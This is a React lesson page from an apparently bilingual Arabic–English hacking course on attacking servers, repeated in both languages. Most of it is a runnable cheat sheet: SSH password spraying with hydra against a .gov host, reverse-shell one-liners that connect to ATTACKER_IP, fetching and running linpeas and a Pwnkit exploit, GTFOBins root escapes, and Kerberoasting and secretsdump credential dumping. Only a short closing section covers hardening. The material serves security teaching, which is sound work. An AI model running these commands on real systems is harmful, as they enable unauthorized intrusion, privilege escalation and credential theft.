"use client";
import { LessonShell, Section, Callout, Code, Terminal, Analogy, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="server-attacks">
      <L
        ar={<>
          <Section title="من الويب إلى السيرفر — تنفيذ الأوامر">
            <Analogy>فتحنا الباب الأمامي للمتجر (الويب). الآن نريد الدخول للمستودع الخلفي (السيرفر) ثم لمكتب المدير (root). كل خطوة تتطلب «مفتاحاً» مختلفاً.</Analogy>
          </Section>
          <Section title="الوصول الأولي — Initial Foothold">
            <ul>
              <li><b>RCE</b> عبر ثغرة ويب (سبق في الدرس السابق).</li>
              <li><b>SSH brute force / spraying</b>.</li>
              <li>خدمة قديمة فيها CVE معروفة (Tomcat, Jenkins, GitLab).</li>
              <li>مفاتيح مسرّبة من GitHub.</li>
            </ul>
            <Code lang="SSH spray (authorized only)">{`hydra -L users.txt -p 'Summer2026!' ssh://target.gov -t 4 -f
crackmapexec ssh target.gov -u root -k id_rsa.leaked`}</Code>
          </Section>
          <Section title="Reverse Shell — قلب الاختراق">
            <Analogy>الـ firewall يمنع الاتصالات الواردة لكن يسمح بالخارجة. الحل: نجعل السيرفر <b>هو الذي يتصل بنا</b>.</Analogy>
            <Code lang="bash">{`# على جهاز المهاجم
nc -lnvp 4444
# على الضحية
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("A",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
busybox nc ATTACKER 4444 -e sh`}</Code>
            <Callout kind="warn" title="ترقية الـ shell">
              <Code lang="upgrade">{`python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm-256color`}</Code>
            </Callout>
          </Section>
          <Section title="رفع الصلاحيات — Linux Privilege Escalation">
            <h3>أتمتة الفحص</h3>
            <Terminal lines={[
              { p: "wget http://ATTACKER/linpeas.sh -O /tmp/p.sh && bash /tmp/p.sh" },
              { o: "[+] SUID binaries:\n /usr/bin/find  — exploitable via GTFOBins\n[!] Writable /etc/passwd" },
            ]} />
            <h3>طرق شائعة لـ root</h3>
            <ol>
              <li><b>SUID binaries</b> — راجع GTFOBins.</li>
              <li><b>Sudo misconfiguration</b> — sudo -l ثم استغلال.</li>
              <li><b>Writable /etc/passwd</b> — أضف مستخدماً بكلمة معروفة.</li>
              <li><b>Cron jobs</b> تشغّل سكربتاً أنت تستطيع تعديله.</li>
              <li><b>Kernel exploits</b> — DirtyPipe (CVE-2022-0847), Pwnkit (CVE-2021-4034).</li>
              <li><b>Docker socket</b> — /var/run/docker.sock mounted = root.</li>
              <li><b>Capabilities</b> — cap_setuid على binary.</li>
            </ol>
            <Code lang="GTFOBins examples">{`find . -exec /bin/sh -p \\; -quit
sudo vim -c ':!/bin/sh'
curl -sLO https://raw.githubusercontent.com/.../pwnkit.c && gcc pwnkit.c -o pk && ./pk`}</Code>
          </Section>
          <Section title="رفع الصلاحيات — Windows">
            <ul>
              <li><b>winPEAS</b>، <b>PowerUp.ps1</b>، <b>Seatbelt</b>.</li>
              <li>Unquoted Service Path.</li>
              <li>AlwaysInstallElevated.</li>
              <li>سرقة الـ tokens بـ Mimikatz / Rubeus.</li>
              <li>Kerberoasting — استخراج SPN ثم كسر بـ hashcat.</li>
            </ul>
            <Code lang="Active Directory">{`GetUserSPNs.py corp.local/user:pass -dc-ip DC -request
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass
secretsdump.py -just-dc corp.local/admin@DC`}</Code>
          </Section>
          <Section title="الدفاع: Server Hardening">
            <ol>
              <li>SSH: فقط مفاتيح، fail2ban، 2FA.</li>
              <li>إزالة كل SUID غير الضروري.</li>
              <li>تطبيق CIS Benchmarks.</li>
              <li>تفعيل auditd + شحن السجلات لـ SIEM.</li>
              <li>EDR مثل Wazuh / CrowdStrike / Defender for Endpoint.</li>
              <li>AppArmor / SELinux في وضع enforcing.</li>
              <li>تقسيم الشبكة لمنع الـ lateral movement.</li>
            </ol>
            <Callout kind="info" title="قاعدة 1-10-60">CrowdStrike: اكتشاف خلال 1 دقيقة، تحقق خلال 10 دقائق، احتواء خلال 60 دقيقة.</Callout>
          </Section>
        </>}
        en={<>
          <Section title="From web to server — getting code execution">
            <Analogy>We opened the front door (the web). Now we want the back warehouse (the server) and finally the manager's office (root). Each step needs a different "key".</Analogy>
          </Section>
          <Section title="Initial foothold">
            <ul>
              <li><b>RCE</b> via a web vulnerability (covered in the previous lesson).</li>
              <li><b>SSH brute force / spraying</b>.</li>
              <li>Old service with a known CVE (Tomcat, Jenkins, GitLab).</li>
              <li>Keys leaked on GitHub.</li>
            </ul>
            <Code lang="SSH spray (authorized only)">{`hydra -L users.txt -p 'Summer2026!' ssh://target.gov -t 4 -f
crackmapexec ssh target.gov -u root -k id_rsa.leaked`}</Code>
          </Section>
          <Section title="Reverse shell — the heart of intrusion">
            <Analogy>The firewall blocks inbound but allows outbound traffic. Solution: make the server <b>connect out to us</b>.</Analogy>
            <Code lang="bash">{`# On attacker box
nc -lnvp 4444
# On victim
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("A",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
busybox nc ATTACKER 4444 -e sh`}</Code>
            <Callout kind="warn" title="Upgrading the shell">
              <Code lang="upgrade">{`python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm-256color`}</Code>
            </Callout>
          </Section>
          <Section title="Linux privilege escalation">
            <h3>Automated enumeration</h3>
            <Terminal lines={[
              { p: "wget http://ATTACKER/linpeas.sh -O /tmp/p.sh && bash /tmp/p.sh" },
              { o: "[+] SUID binaries:\n /usr/bin/find  — exploitable via GTFOBins\n[!] Writable /etc/passwd" },
            ]} />
            <h3>Common paths to root</h3>
            <ol>
              <li><b>SUID binaries</b> — see GTFOBins.</li>
              <li><b>Sudo misconfig</b> — sudo -l, then exploit.</li>
              <li><b>Writable /etc/passwd</b> — add a user with a known password hash.</li>
              <li><b>Cron jobs</b> running a script you can modify.</li>
              <li><b>Kernel exploits</b> — DirtyPipe (CVE-2022-0847), Pwnkit (CVE-2021-4034).</li>
              <li><b>Docker socket</b> — /var/run/docker.sock mounted = root.</li>
              <li><b>Capabilities</b> — cap_setuid on a binary.</li>
            </ol>
            <Code lang="GTFOBins examples">{`find . -exec /bin/sh -p \\; -quit
sudo vim -c ':!/bin/sh'
curl -sLO https://raw.githubusercontent.com/.../pwnkit.c && gcc pwnkit.c -o pk && ./pk`}</Code>
          </Section>
          <Section title="Windows privilege escalation">
            <ul>
              <li><b>winPEAS, PowerUp.ps1, Seatbelt</b>.</li>
              <li>Unquoted Service Path.</li>
              <li>AlwaysInstallElevated.</li>
              <li>Token theft via Mimikatz / Rubeus.</li>
              <li>Kerberoasting — request SPN tickets, then crack with hashcat.</li>
            </ul>
            <Code lang="Active Directory">{`GetUserSPNs.py corp.local/user:pass -dc-ip DC -request
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass
secretsdump.py -just-dc corp.local/admin@DC`}</Code>
          </Section>
          <Section title="Defense: server hardening">
            <ol>
              <li>SSH: keys only, fail2ban, 2FA.</li>
              <li>Strip every unneeded SUID.</li>
              <li>Apply CIS Benchmarks.</li>
              <li>Enable auditd + ship logs to a SIEM.</li>
              <li>EDR such as Wazuh / CrowdStrike / Defender for Endpoint.</li>
              <li>AppArmor / SELinux in enforcing mode.</li>
              <li>Network microsegmentation to block lateral movement.</li>
            </ol>
            <Callout kind="info" title="The 1-10-60 rule">CrowdStrike: detect in 1 minute, investigate in 10, contain in 60.</Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
